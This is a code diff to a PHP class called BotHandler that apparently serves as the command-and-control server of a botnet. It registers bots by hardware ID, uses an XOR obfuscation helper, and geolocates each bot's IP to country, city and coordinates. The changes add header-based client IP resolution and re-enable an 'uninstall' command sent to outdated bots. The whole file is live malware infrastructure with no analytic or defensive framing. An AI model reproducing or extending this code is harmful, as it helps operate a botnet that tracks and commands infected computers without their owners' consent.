@@ -5,6 +5,21 @@ use GeoIp2\Database\Reader;
 class BotHandler
 {
 
+    private function getUserIP() {
+        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
+            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
+            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
+        }
+        $client  = @$_SERVER['HTTP_CLIENT_IP'];
+        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+        $remote  = $_SERVER['REMOTE_ADDR'];
+
+        if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
+        elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; }
+        else { $ip = $remote; }
+
+        return $ip;
+    }
 
     public function xor_this($data)
     {
@@ -34,7 +49,7 @@ class BotHandler
 
         if (!empty($_POST["botversion"])) {
             //Old version
-            //die("uninstall");
+            die("uninstall");
         }
 
         //  var_dump($_POST);
@@ -64,27 +79,22 @@ class BotHandler
 
             $reader = new Reader(__DIR__ . '/../../Geo/GeoLite2-City.mmdb');
 
-            if (!empty($_SERVER['REMOTE_ADDR'])) {
-                try{
-                    $ip = $_SERVER['REMOTE_ADDR'];
-                    $record = $reader->city($ip);
-                    $country = $record->country->isoCode;
-                    $countryName = $record->country->name;
-                    $countryCity = $record->city->name;
-                    $countryLatitude = $record->location->latitude;
-                    $countryLongitude = $record->location->longitude;
-                }catch (Exception $e){
-                    $country = "unknow";
-                    $countryLatitude = "unknow";
-                    $countryLongitude = "unknow";
-                    $countryName = "unknow";
-                }
-            } else {
+
+            try{
+                $ip = $this->getUserIP();
+                $record = $reader->city($ip);
+                $country = $record->country->isoCode;
+                $countryName = $record->country->name;
+                $countryCity = $record->city->name;
+                $countryLatitude = $record->location->latitude;
+                $countryLongitude = $record->location->longitude;
+            }catch (Exception $e){
                 $country = "unknow";
                 $countryLatitude = "unknow";
                 $countryLongitude = "unknow";
                 $countryName = "unknow";
             }
+
 
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE hwid LIKE ?");
             $statement->execute(array($postbot["hwid"]));
@@ -135,7 +145,7 @@ class BotHandler
                                                         continue;
                                                     }
                                                 }
-
+                                                //continue;
                                             }else{
                                                 continue;
                                             }
